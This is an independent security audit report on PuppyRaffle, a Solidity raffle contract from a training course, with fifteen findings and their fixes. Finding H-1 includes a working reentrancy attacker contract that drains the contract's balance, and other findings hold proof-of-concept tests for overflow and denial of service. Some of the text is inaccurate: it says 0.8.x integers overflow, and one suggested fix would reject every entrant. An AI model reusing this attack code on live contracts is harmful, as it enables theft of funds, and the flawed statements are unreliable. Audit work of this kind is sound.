---
# ── Report metadata (drives the cover page + running header/footer) ──
title: "PuppyRaffle Audit Report"
subtitle: "Smart Contract Security Review"
protocol: "PuppyRaffle"
version: "1.0"
author: "Joev"
author-handle: "Joev"
author-role: "Independent Smart Contract Security Researcher"
author-url: "https://github.com/joevly"
date: "June 6, 2026"
commit: "2a47715b30cf11ca82db148704e67652ad679cd8"
repo: "https://github.com/Cyfrin/4-puppy-raffle-audit"
logo: "template/logo.pdf"
toc: true
---

# About the Auditor

Joev is an independent smart contract security researcher.

- GitHub: <https://github.com/joevly>

# Disclaimer

This document records a time-boxed security review performed by Joev on the specific
code and commit identified in *Audit Details*. It describes the issues found within that window and
is **not** a guarantee that the code is free of vulnerabilities — a clean report lowers risk, it does
not remove it.

The review covers only the on-chain Solidity implementation in scope. Off-chain components, economic
and incentive design, governance, deployment configuration, and third-party dependencies are out of
scope unless explicitly stated. This review is not an endorsement of the protocol, its team, or its
business, and nothing here is financial, investment, or legal advice. Ongoing testing, monitoring,
and independent review remain the responsibility of the protocol team.

# Protocol Summary

This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

1. Call the `enterRaffle` function with the following parameters:
   1. `address[] participants`: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
2. Duplicate addresses are not allowed
3. Users are allowed to get a refund of their ticket & `value` if they call the `refund` function
4. Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
5. The owner of the protocol will set a feeAddress to take a cut of the `value`, and the rest of the funds will be sent to the winner of the puppy.

# Audit Details

The findings in this document correspond to the following commit hash:

```
2a47715b30cf11ca82db148704e67652ad679cd8
```

## Scope

```
./src/
#-- PuppyRaffle.sol
```

- **Solc version:** 0.7.6
- **Chain(s) to deploy to:** Ethereum Mainnet.

## Roles

- **Owner:** Deployer of the protocol, has the power to change the wallet address to which fees are sent through the `changeFeeAddress` function.
- **Player:** Participant of the raffle, has the power to enter the raffle with the `enterRaffle` function and refund value through the `refund` function.

# Methodology & Tools

This review combined:

- **Manual review** — line-by-line reading of `PuppyRaffle.sol`, focused on access control, external
  calls / reentrancy, accounting and arithmetic, and randomness.
- **Dynamic testing** — Foundry unit tests and proof-of-concept exploits (reentrancy drain, integer
  overflow of `totalFees`) plus gas profiling to demonstrate the duplicate-check denial-of-service.
- **Static analysis** — Slither, to surface common code-quality issues (e.g. wide/outdated pragma
  warnings) that back the informational findings.

# Risk Classification

Severity is a function of **likelihood** (how easily the issue can be triggered) and **impact** (how
damaging it is if triggered):

|            |        | Impact   |        |        |
| ---------- | ------ | -------- | ------ | ------ |
|            |        | High     | Medium | Low    |
|            | High   | Critical | High   | Medium |
| Likelihood | Medium | High     | Medium | Low    |
|            | Low    | Medium   | Low    | Low    |

This Critical / High / Medium / Low model is the de-facto standard among audit firms and bug-bounty
platforms (e.g. Cantina, OpenZeppelin, Immunefi). Informational and Gas findings sit outside the
matrix as code-quality and optimization notes.

# Severity Definitions

- **Critical** — directly and easily exploitable loss or theft of funds, or full protocol compromise.
  Must be fixed before deployment.
- **High** — loss of funds or a broken core invariant under realistic conditions; urgent fix.
- **Medium** — conditional or bounded harm, or protocol disruption where recovery is likely; fix
  recommended.
- **Low** — limited impact, unlikely preconditions, or a deviation from best practice with minor effect.
- **Informational** — no direct security impact: code quality, readability, unused code, events.
- **Gas** — optimizations that reduce gas with no change to behavior.

# Executive Summary

The audit process took a week due to the many new vulnerabilities and hacking patterns I hadn't encountered before. I discovered over 10 vulnerabilities for this protocol.

## Issues found

| Severity | Number of issues found |
| -------- | ---------------------- |
| Critical | 0                      |
| High     | 3                      |
| Medium   | 2                      |
| Low      | 1                      |
| Info     | 7                      |
| Gas      | 2                      |
| Total    | 15                     |

# Findings Summary

| ID    | Short title                                       | Severity | Status |
| ----- | ------------------------------------------------- | -------- | ------ |
| H-1   | Reentrancy in `refund` drains the raffle balance  | High     | Open   |
| H-2   | Weak randomness lets users predict the winner     | High     | Open   |
| H-3   | `totalFees` overflow permanently loses fees       | High     | Open   |
| M-1   | Duplicate-check loop enables a DoS                 | Medium   | Open   |
| M-2   | Winner with no `receive`/`fallback` blocks reset  | Medium   | Open   |
| L-1   | `getActivePlayerIndex` returns 0 ambiguously       | Low      | Open   |
| I-1   | Solidity pragma should be specific                 | Info     | Open   |
| I-2   | Outdated Solidity version                          | Info     | Open   |
| I-3   | Missing `address(0)` checks                         | Info     | Open   |
| I-4   | `selectWinner` does not follow CEI                  | Info     | Open   |
| I-5   | Use of "magic" numbers                              | Info     | Open   |
| I-6   | Missing events in key functions                     | Info     | Open   |
| I-7   | Unused `_isActivePlayer` function                   | Info     | Open   |
| G-1   | Unchanged vars should be constant/immutable         | Gas      | Open   |
| G-2   | Cache storage array length in loops                 | Gas      | Open   |

# Findings

## Critical

_No critical severity issues found._

## High

### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function doesn't follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>      payable(msg.sender).sendValue(entranceFee);
@>      players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
3. Attacker enters the raffle from their attack contract.
4. Attacker also calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

**Proof of Code**

Place the following into `PuppyRaffleTest.t.sol`.

```javascript
    function testReentrance() public playersEntered {
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker), 1e18);
        uint256 startingAttackerBalance = address(attacker).balance;
        uint256 startingRaffleBalance = address(puppyRaffle).balance;

        attacker.attack();

        uint256 endingAttackerBalance = address(attacker).balance;
        uint256 endingRaffleBalance = address(puppyRaffle).balance;
        assertEq(endingAttackerBalance, startingAttackerBalance + startingRaffleBalance);
        assertEq(endingRaffleBalance, 0);

        console.log("Starting attacker balance: ", startingAttackerBalance);
        console.log("Starting raffle balance: ", startingRaffleBalance);
        console.log("Ending attacker balance: ", endingAttackerBalance);
        console.log("Ending raffle balance: ", endingRaffleBalance);
    }
```

And this contract as well.

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }
}
```

**Recommended Mitigation:** To prevent this, We should have to update `players` array before making the external call in `PuppyRaffle::refund` function. Additionally, we should move the event emission up as well after `players` array updating.

```diff
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
    }
```

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy

**Description:** Hashing `msg.sender`, `block.timestamp`, `block.difficulty` together creates a predictable find number. A predictable number is not a good random number. Malicious user dan manipulate these values or know them ahead of time to choose the winner of the raffle themselves. 

*Note:* This additionally means users could front-run this function and call `refund` function if they see they are not the winner.

**Impact:** Any user can influence the winner of the raffle, winning the money and selecting the rarest puppy. Making the entire raffle worthless if it becomes a gas war as to who wins the raffles.

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate. See the [Solidity blog on prevrandao](https://soliditydeveloper.com/prevrandao). `block.difficulty` was recently replaced with prevrandao
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generated the winner
3. User can revert their `selectWinner` transaction if they don't like the winner or resulting puppy

Using on-chain values as a randomness send is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using a cryptographically provable random number generator such as Chainlink VRF.

### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

**Description:** In solidity versions especially for `0.8.x` integers were subject to integer overflow.

```javascript
uint64 myVar = type(uint64).max
// Output: 18446744073709551615
myVar + 1
// myVar will be 0
```

**Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `PuppyRaffle::withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Concept:**
1. We conclude a raffle of 4 players
2. We then have 89 players enter a new raffle and conclude the raffle
3. `totalFees` will be:
```javascript
totalFees = totalFees + uint64(fee);
// Also known as
totalFees = 800000000000000000 + 17800000000000000000
// And this will overflow!
totalFees = 153255926290448384
```
4. You will not be able to withdraw, due to the line in `PuppyRaffle::withdrawFees`:

```javascript
require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

Although you could use `selfdestruct` to send ETH to this contract in order to for the values to match and withdraw the fees, this is clearly not the intended design of the protocol. At some point, there will be too much `balance` in the contract that the above `require` will be impossible to hit.

```javascript
    function testTotalFeesOverflow() public playersEntered {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 0.8 ETH -> 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 numPlayers = 89;
        address[] memory players = new address[](numPlayers);
        for (uint256 i; i < numPlayers; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("starting total fees: ", startingTotalFees);
        console.log("ending total fees: ", endingTotalFees);
        
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```

**Recommended Mitigation:** There are a few possible mitigations.

1. Use a newer version of solidity `0.8.x` and a `uint256` instead of `uint64` for `PuppyRaffle::totalFees`
```diff
-   pragma solidity ^0.7.6;
+   pragma solidity ^0.8.20;
    .
    .
    .
-   uint64 public totalFees = 0;
+   uint256 public totalFees = 0;
```
2. You could also use the `SafeMath` library of OpenZeppelin for version `0.7.6` of solidity. However you would still have a hard time with the `uint64` type if too many fees are collected.
3. Remove the balance check from `PuppyRaffle::withdrawFees`

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

There are more attack vectors with that final require, so we recommend removing it regardless.

## Medium

### [M-1] Looping through an array of players to check duplicates in `PuppyRaffle::enterRaffle` is a potensial Denial of Service (DoS) attack that could increase gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array, the more checks it have to make. This means that the gas cost for players who enter right at the time of the draw will be significantly lower than for those who enter later. Each additional address in the `players` array is an additional check the loop must perform.

```javascript
// DoS Attack
@>      for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```

**Impact:** The gas costs for raffle entrants will increase drastically as more players enter the raffle. Discouraging later users from entering and causing a rush at the start of a raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle::players` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:
- 1st 100 players: ~6503225
- 2st 100 players: ~18995465

This more than 3x more expensive for the second 100 players.

Place the following test into `PuppyRaffleTest.t.sol`.

```javascript
    function test_denialOfService() public {
        // Let's enter 100 players
        uint256 playersNum = 100;
        address[] memory players = new address[](playersNum);
        for (uint256 i; i < playersNum; i++) {
            players[i] = address(i);
            // players[0] = address(0)
            // players[0] = address(1)
        }

        // See how much gas it costs
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
        uint256 gasEnd = gasleft();

        uint256 gasUsedFirst = (gasStart - gasEnd);
        console.log("Gas cost of the first 100 players: ", gasUsedFirst);

        // Let's enter 2nd 100 players
        address[] memory playersTwo = new address[](playersNum);
        for (uint256 i; i < playersNum; i++) {
            playersTwo[i] = address(i + playersNum); // 0, 1, 2 --> 100, 101, 102
        }

        // See how much gas it costs
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
        uint256 gasEndSecond = gasleft();

        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond);
        console.log("Gas cost of the Second 100 players (200 players): ", gasUsedSecond);

        assert(gasUsedFirst < gasUsedSecond);
    }
```

Output:

```bash
Ran 1 test for test/PuppyRaffleTest.t.sol:PuppyRaffleTest
[PASS] test_denialOfService() (gas: 25532987)
Logs:
  Gas cost of the first 100 players:  6503225
  Gas cost of the Second 100 players (200 players):  18995465
```

**Recommended Mitigation:** There are a few recommendations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check for duplicates. This would allow constant time lookup of whether a user has already entered.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+           addressToRaffleId[newPlayers[i]] = raffleId;
        }

-       // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+           require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-       for (uint256 i = 0; i < players.length - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
-               require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-           }
-       }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    }
```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

### [M-2] Smart contract wallets raffle winners without a `receive` or a `fallback` function will block the start of a new contest.

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Users could easily call the `sellectWinner` function again and non-wallet entrants could enter, but it could cost a lot due to the duplicate check and a lottery reset could get very challenging.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, making a lottery reset difficult.

Also, true winners would not get paid out and someone else could take their money.

**Proof of Concept:**

1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout amounts so winners can pull their funds out themselves with a new `claimPrize` function, putting the owness on the winner to claim their price (Recommended)

> Pull over Push

## Low

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle

**Description:** if a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```javascript
    // @return the index of the player in the array, if they are not active, it returns 0
    function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }
```

**Impact:** A player at index 0 may incorrectly think they have not entered the raffle and leading them to enter raffle again. This can actually waste gas.

**Proof of Concept:**

1. User enters the raffle and they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation 

**Recommended Mitigation:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0. But a better solution might be to return an `int256` where the function return -1 if the player is not active.

## Informational

### [I-1] Solidity pragma should be specific, not wide

**Description:** Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`

- Found in src/PuppyRaffle.sol

    ```solidity
    pragma solidity ^0.7.6;
    ```

### [I-2] Using an outdated version of Solidity is not recommended

solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement.

**Recommendation**:
Deploy with a recent version of Solidity (at least `0.8.0`) with no known severe issues.

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information about that.

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

Check for `address(0)` when assigning values to address state variables.

- Found in src/PuppyRaffle.sol - `constructor`

    ```solidity
            feeAddress = _feeAddress;
    ```

- Found in src/PuppyRaffle.sol - `PuppyRaffle::changeFeeAddress`

    ```solidity
            feeAddress = newFeeAddress;
    ```

### [I-4] `PuppyRaffle::selectWinner` doesn't follow CEI pattern, which is not a best practice

It's best to keep code clean and follow CEI (Checks, Effects, Interactions).

```diff
-       (bool success,) = winner.call{value: prizePool}("");
-       require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+       (bool success,) = winner.call{value: prizePool}("");
+       require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

### [I-5] Use of "magic" numbers is discouraged

It can be confusing to see the number literals in a codebase and it's much more readable if the numbers are given a name.

Examples:
```javascript
        uint256 prizePool = (totalAmountCollected * 80) / 100;
        uint256 fee = (totalAmountCollected * 20) / 100;
```

Instead, you could use:
```javascript
        uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
        uint256 public constant FEE_PERCENTAGE = 20;
        uint256 public constant PERCENTAGE_DIVISOR = 100;
```

### [I-6] Missing event in `PuppyRaffle::selectWinner` and `PuppyRaffle::withdrawFees` function

Emit the event in every function is recommended and important. It is recommended to add event emitting. Event is important for tracking data off-chain like monitoring the contract, frontend or indexer.

You can add this code in event part:
```diff
    event RaffleEnter(address[] newPlayers);
    event RaffleRefunded(address player);
    event FeeAddressChanged(address newFeeAddress);
+   event WinnerSelected(address indexer winner, uint256 prizePool, uint256 tokenId);
+   event FeeWithdrawn(address indexer feeAddress, uint256 amount);
```

Add this code in `PuppyRaffle::selectWinner`:
```diff
    function selectWinner() external {
        .
        .
        .
+       emit WinnerSelected(winner, prizePool, tokenId);
    }
```

Add this code in `PuppyRaffle::withdrawFees`:

For the best implementation, use the emit event in call withdraw above. Following the CEI (Checks, Effects, Interactions) pattern, the emit event is included in the Effects. 
```diff
function withdrawFees() external {
        require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
        uint256 feesToWithdraw = totalFees;
        totalFees = 0;
+       emit FeeWithdrawn(feeAddress, feeToWithdraw);
        (bool success,) = feeAddress.call{value: feesToWithdraw}("");
        require(success, "PuppyRaffle: Failed to withdraw fees");
    }
```

### [I-7] `PuppyRaffle::_isActivePlayer` is never used in the contract

`PuppyRaffle::_isActivePlayer` is never used in the contract, it is recommended to remove that function to save a gas.

## Gas

### [G-1] Unchanged state variables should be declared constant or immutable

Reading from storage variable is much more expensive gas than reading from a constant or immutable variable.

Instances:
- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`

### [G-2] Storage variables in a loop should be cached

Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient. So, create `playersLength` variable which is a memory variable to save more gas.

```diff
+       uint256 playersLength = players.length;
-       for (uint256 i = 0; i < players.length - 1; i++) {
+       for (uint256 i = 0; i < playersLength - 1; i++) {
-           for (uint256 j = i + 1; j < players.length; j++) {
+           for (uint256 j = i + 1; j < playersLength; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }
```
